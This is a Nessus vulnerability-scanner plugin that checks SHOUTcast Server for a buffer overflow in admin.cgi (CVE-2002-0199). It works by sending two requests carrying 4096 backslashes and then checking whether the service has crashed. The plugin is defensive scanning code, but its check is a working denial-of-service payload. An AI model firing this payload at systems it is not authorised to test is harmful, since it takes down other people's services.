#
# (C) Tenable Network Security, Inc.
#

# References:
# Date:  Mon, 21 Jan 2002 22:04:58 -0800
# From: "Austin Ensminger" <skream@pacbell.net>
# Subject: Re: Shoutcast server 1.8.3 win32
# To: bugtraq@securityfocus.com
#
# Date:  19 Jan 2002 18:16:49 -0000
# From: "Brian Dittmer" <bditt@columbus.rr.com>
# To: bugtraq@securityfocus.com
# Subject: Shoutcast server 1.8.3 win32
#

include("compat.inc");

if(description)
{
  script_id(11719);
  script_version ("$Revision: 1.19 $");

  script_cve_id("CVE-2002-0199");
  script_bugtraq_id(3934);
  script_xref(name:"OSVDB", value:"14300");
  
  script_name(english:"SHOUTcast Server admin.cgi Long Argument Overflow");
 
  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote streaming audio server is vulnerable a buffer overflow\n",
      "attack."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote SHOUTcast Server crashes when an overly large number of\n",
      "backslashes is passed as an argument to its 'admin.cgi' script.  An\n",
      "unauthenticated remote attacker can leverage this issue to crash the\n",
      "affected service or possibly even execute arbitrary code on the\n",
      "affected host."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://archives.neohapsis.com/archives/bugtraq/2002-01/0255.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Unknown at this time."
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();
 
  script_summary(english:"Overflows admin.cgi");
  script_category(ACT_DENIAL);
 
  script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 8888);
  # Shoutcast is often on a high port
  exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

ports = add_port_in_list(list:get_kb_list("Services/www"), port:8888);
foreach port (ports)
{
 if( get_port_state(port)  && !get_kb_item("Services/www/" + port + "/embedded") && !http_is_dead(port:port, retry:0))
 {
  banner = get_http_banner(port:port);
  if ( ! banner || "shoutcast" >!< tolower(banner) ) continue;
  url = string("/admin.cgi?pass=", crap(length:4096, data:"\"));
  req = http_get(item: url, port:port);
  soc = http_open_socket(port);
  if (!soc)exit(0);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  url = string("/admin.cgi?", crap(length:4096, data:"\"));
  req = http_get(item: url, port:port);
  soc = http_open_socket(port);
  if (soc) {
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  }
  
  if (http_is_dead(port: port))
  {
   security_hole(port: port);
   exit(0);
  }
 }
}

